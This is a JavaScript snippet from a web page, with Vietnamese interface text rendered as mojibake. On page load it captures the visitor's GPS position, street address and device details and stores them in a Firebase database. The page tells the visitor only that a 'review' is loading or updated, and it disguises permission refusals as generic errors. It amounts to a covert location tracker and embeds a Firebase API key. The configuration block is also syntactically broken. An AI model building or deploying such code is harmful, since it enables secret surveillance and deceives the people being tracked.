    <script type="module">
        // Import the functions you need from the SDKs
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.21.0/firebase-app.js";
        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.21.0/firebase-firestore.js";

        // Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyCPrnIf-vF2_JOf-E8hgtEVOyCq8s1AviY",
            authDomain: "gknm-b263e.firebaseapp.com",
            projectId: "gknm-b263e",

            measurementId: "G-TWXGN6PJ32"

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        // Function to get device info using UAParser.js
        function getDeviceInfo() {
            const parser = new UAParser();
            const result = parser.getResult();

            // Extract device information
            const deviceInfo = {
                device: result.device.model || "Unknown Device",
                os: result.os.name + " " + result.os.version,
                browser: result.browser.name + " " + result.browser.version
            };

            return deviceInfo;
        }

        // Function to get address from latitude and longitude using Nominatim
        async function getAddress(lat, lng) {
            const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`;
            try {
                const response = await fetch(url);
                const data = await response.json();
                if (data && data.address) {
                    // Construct the address string from the response
                    const address = `${data.address.road}, ${data.address.city || data.address.town || data.address.village}, ${data.address.country}`;
                    return address;
                } else {
                    throw new Error('Kh√¥ng th·ªÉ l·∫•y ƒë·ªãa ch·ªâ');
                }
            } catch (error) {
                console.error("Error fetching address:", error);
                return "ƒê·ªãa ch·ªâ kh√¥ng x√°c ƒë·ªãnh";
            }
        }

        // Get location and save to Firestore along with device info
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    const deviceInfo = getDeviceInfo(); // Get the device information

                    // Show loading while fetching address
                    document.getElementById("result").innerHTML = 
                        '<div class="loading"></div> ƒêang l·∫•y ƒë√°nh gi√°...';

                    // Get address from latitude and longitude
                    const address = await getAddress(latitude, longitude);

                    document.getElementById("result").innerHTML = 
                        `ƒê√°nh gi√° ƒë√£ ƒë∆∞·ª£c c·∫≠p nh·∫≠t.`;

                    document.getElementById("result").classList.add("success");

                    // Save to Firestore
                    try {
                        const docRef = await addDoc(collection(db, 'location'), {
                            latitude: latitude,
                            longitude: longitude,
                            address: address, // Save address
                            device: deviceInfo.device, // Save device model
                            os: deviceInfo.os, // Save OS info
                            browser: deviceInfo.browser, // Save browser info
                            timestamp: serverTimestamp()
                        });
                        console.log(`Document written with ID: ${docRef.id}`);
                    } catch (error) {
                        console.error("Error adding document: ", error);
                    }
                }, showError);
            } else {
                alert("Tr√¨nh duy·ªát c·ªßa b·∫°n kh√¥ng h·ªó tr·ª£ ch·ª©c nƒÉng n√†y.");
            }
        }

        function showError(error) {
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    alert("C√≥ l·ªói x·∫£y ra khi x·ª≠ l√Ω y√™u c·∫ßu c·ªßa b·∫°n. Vui l√≤ng th·ª≠ l·∫°i sau.");
                    break;
                case error.POSITION_UNAVAILABLE:
                    alert("D·ªØ li·ªáu hi·ªán kh√¥ng kh·∫£ d·ª•ng. Vui l√≤ng th·ª≠ l·∫°i sau.");
                    break;
                case error.TIMEOUT:
                    alert("Qu√° tr√¨nh x·ª≠ l√Ω b·ªã gi√°n ƒëo·∫°n. Vui l√≤ng th·ª≠ l·∫°i.");
                    break;
                case error.UNKNOWN_ERROR:
                    alert("ƒê√£ x·∫£y ra m·ªôt l·ªói kh√¥ng x√°c ƒë·ªãnh. Vui l√≤ng th·ª≠ l·∫°i.");
                    break;
            }
        }

        // Automatically get location when the page loads
        document.addEventListener("DOMContentLoaded", function() {
            // Khi trang v·ª´a t·∫£i, hi·ªÉn th·ªã hi·ªáu ·ª©ng loading
            document.getElementById("result").innerHTML = 
                '<div class="loading"></div> ƒêang x·ª≠ l√Ω...';
            getLocation();
        });
    </script>
